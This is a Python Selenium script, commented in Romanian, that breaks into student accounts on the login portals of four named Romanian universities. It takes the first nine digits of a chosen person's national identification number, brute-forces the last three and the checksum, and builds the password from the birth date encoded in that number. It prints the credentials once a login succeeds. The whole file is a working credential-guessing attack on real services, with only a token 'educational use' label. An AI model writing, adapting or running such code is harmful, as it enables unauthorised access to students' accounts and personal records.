# A se folosi in scop educational !

# Python 2.7
# Selenium


from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException


link_unibuc = 'http://ums.unibuc.ro/do/secure/inregistrare_user'
link_umf = 'https://portal.umf.ro/studenti/do/secure/inregistrare_user'
link_costel = 'http://studenti.utgjiu.ro/ums/do/secure/inregistrare_user'
link_vacute = 'http://student.usamv.ro:8080/ums/do/secure/inregistrare_user'
link = ''

print('In ce universitate se afla cel cautat ?')
print('1. Universitatea din Bucuresti')
print('2. UMF Carol Davila')
print('3. Costica Brancusi')
print('4. Agronomie si medicina veterinara')

choice = input()
if choice == 1:
    link = link_unibuc
elif choice == 2:
    link = link_umf
elif choice == 3:
    link = link_costel
elif choice == 4:
    link = link_vacute
else:
    print('Nu ai ales o varianta corecta !')
    exit(1)

path_gecodriver = 'path'

driver = webdriver.Firefox(executable_path=path_gecodriver)

control = [2, 7, 9, 1, 4, 6, 3, 5, 8, 2, 7, 9]

cnp = str(input('Introduceti primele 9 cifre: '))
cnpInitial = cnp


password3 = cnp[5] + cnp[6] + '-' + cnp[3] + cnp[4] + '-' + '1' + '9' + cnp[1] + cnp[2]
last = 0

for a in range(0, 10):
    for b in range(0, 10):
        for c in range(0, 10):
            driver.get(link)
            cnp += (str(a) + str(b) + str(c))
            cnpInt = [int(i) for i in cnp]

            for z in range(0, 12):
                last += cnpInt[z] * control[z]

            if last % 11 == 10:
                last = 1
            else:
                last = last % 11
            cnp += str(last)

            username = driver.find_element_by_id('j_username')
            password = driver.find_element_by_id('j_password')
            username.send_keys(cnp)
            password.send_keys(password3)


            driver.find_element_by_xpath('//*[@id="loginForm"]/span/input').click()
            try:
                error = driver.find_element_by_class_name('camp_error')
                if error.text is not None:
                    cnp = cnpInitial
                    last = 0
            except NoSuchElementException:
                print(cnp)
                print(password3)
                print '####### SUCCESS ! ########'
                choice = raw_input('Vrei sa continui cautarea ? Y/N')
                if choice == 'Y' or choice == 'y':
                    driver.find_element_by_xpath("//a[@href='/ums/do/secure/logout']").click()
                    continue
                else:
                    exit(0)
